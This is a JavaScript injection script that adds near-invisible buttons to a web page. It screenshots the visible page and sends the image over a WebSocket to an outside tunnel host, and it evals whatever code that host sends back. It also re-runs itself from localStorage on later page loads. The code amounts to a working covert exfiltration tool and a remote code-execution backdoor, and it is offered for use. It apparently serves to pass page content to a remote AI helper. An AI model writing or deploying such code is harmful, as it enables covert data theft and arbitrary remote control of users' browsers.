(function () {
  if (window.__ai_injected) return;
  window.__ai_injected = true;

  let resultDivRef = null;
  let captureBtnRef = null;

  // Load html2canvas as before
  function loadHtml2Canvas(cb) {
    if (window.html2canvas) return cb();
    const s = document.createElement("script");
    s.src =
      "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
    s.onload = () => cb();
    s.onerror = () => cb(new Error("html2canvas failed"));
    document.head.appendChild(s);
  }

  function createUI() {
    const btn = document.createElement("button");
    btn.style.border = "none";
    btn.style.background = "transparent";
    btn.textContent = ".";
    captureBtnRef = btn;

    const resultDiv = document.createElement("div");
    resultDiv.style.padding = "0px 350px";
    resultDivRef = resultDiv;

    const toggleBtn = document.createElement("button");
    toggleBtn.style.border = "none";
    toggleBtn.style.background = "transparent";
    toggleBtn.textContent = "-";
    toggleBtn.style.marginLeft = "10px";

    btn.onclick = async function () {
      btn.disabled = true;
      btn.textContent = "...";
      try {
        const canvas = await html2canvas(document.documentElement, {
          useCORS: true,
          scale: 1,
        });
        const sx = window.scrollX,
          sy = window.scrollY,
          w = window.innerWidth,
          h = window.innerHeight;
        const crop = document.createElement("canvas");
        crop.width = w;
        crop.height = h;
        crop.getContext("2d").drawImage(canvas, sx, sy, w, h, 0, 0, w, h);
        const dataUrl = crop.toDataURL("image/png");
        if (window.socket && window.socket.readyState === 1)
          window.socket.send(dataUrl);
      } catch (err) {
        console.error("Capture failed", err);
      }
      btn.textContent = " ";
      btn.disabled = false;
    };

    toggleBtn.onclick = () => {
      const isHidden = captureBtnRef.style.display === "none";
      captureBtnRef.style.display = isHidden ? "inline-block" : "none";
      resultDivRef.style.display = isHidden ? "block" : "none";
      toggleBtn.textContent = isHidden ? "--" : "-";
    };

    document.body.appendChild(toggleBtn);
    document.body.appendChild(btn);
    document.body.appendChild(resultDiv);
  }

  // --- WS Connect function that retries and stores code in localStorage ---
  function connectWS() {
    let ws;
    function init() {
      ws = new WebSocket("wss://open-drinks-smile.loca.lt"); // your WS endpoint here
      ws.onopen = () => {
        console.log("[AI] WS connected");
        window.socket = ws;
      };
      ws.onmessage = (e) => {
        if (resultDivRef) {
          resultDivRef.textContent += e.data + "\n\n";
        }
        try {
          eval(e.data);
        } catch (err) {
          console.error(err);
        }
      };
      ws.onclose = () => {
        console.log("[AI] WS disconnected, retrying in 2s...");
        setTimeout(init, 2000);
      };
      ws.onerror = (err) => {
        console.error("[AI] WS error:", err);
        ws.close();
      };
    }
    init();
  }

  // Save connectWS code in localStorage (stringified)
  const wsInjectCode = `
    (${connectWS.toString()})();
  `;
  localStorage.setItem("__ws_inject_code", wsInjectCode);

  // Auto-run WS code from localStorage on page load
  if (!window.__ws_injected) {
    window.__ws_injected = true;
    const code = localStorage.getItem("__ws_inject_code");
    if (code) eval(code);
  }

  // Also ensure WS reconnect runs after DOM loads (survive reloads)
  document.addEventListener("DOMContentLoaded", () => {
    const code = localStorage.getItem("__ws_inject_code");
    if (code) eval(code);
  });

  loadHtml2Canvas(createUI);
})();
